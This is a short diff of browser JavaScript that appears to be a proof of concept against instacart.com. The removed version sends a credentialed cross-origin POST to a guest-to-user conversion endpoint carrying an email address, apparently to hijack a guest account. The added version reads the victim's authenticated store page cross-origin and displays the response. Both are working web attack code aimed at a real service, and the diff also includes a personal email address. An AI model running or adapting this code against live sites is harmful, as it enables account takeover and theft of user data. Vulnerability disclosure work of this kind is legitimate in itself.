@@ -1,6 +1,9 @@
 var xhr = new XMLHttpRequest();
-xhr.open('POST', 'https://www.instacart.com/api/v2/guests/convert_to_user', true);
-xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest')
+xhr.onreadystatechange = function() {
+	    if (xhr.readyState == XMLHttpRequest.DONE) {
+		            alert(xhr.responseText);
+		        }
+}
+xhr.open('GET', 'https://www.instacart.com/store', true);
 xhr.withCredentials = true;
-xhr.send('email=green.epita2016@gmail.com');
+xhr.send(null);
